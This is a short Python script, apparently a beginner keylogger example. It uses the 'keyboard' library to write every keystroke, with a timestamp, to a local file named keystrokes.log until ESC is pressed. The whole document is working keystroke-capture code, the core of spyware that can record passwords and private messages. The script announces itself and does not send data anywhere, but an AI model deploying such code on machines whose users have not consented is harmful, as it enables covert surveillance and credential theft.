import keyboard
from datetime import datetime

def on_key_press(event):
    with open("keystrokes.log", "a") as f:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{now}] {event.name}\n")

print("Keylogger started. Press ESC to stop.")
keyboard.on_press(on_key_press)

# Wait for ESC to stop the keylogger
keyboard.wait("esc")
print("Keylogger stopped. Logs saved to keystrokes.log")
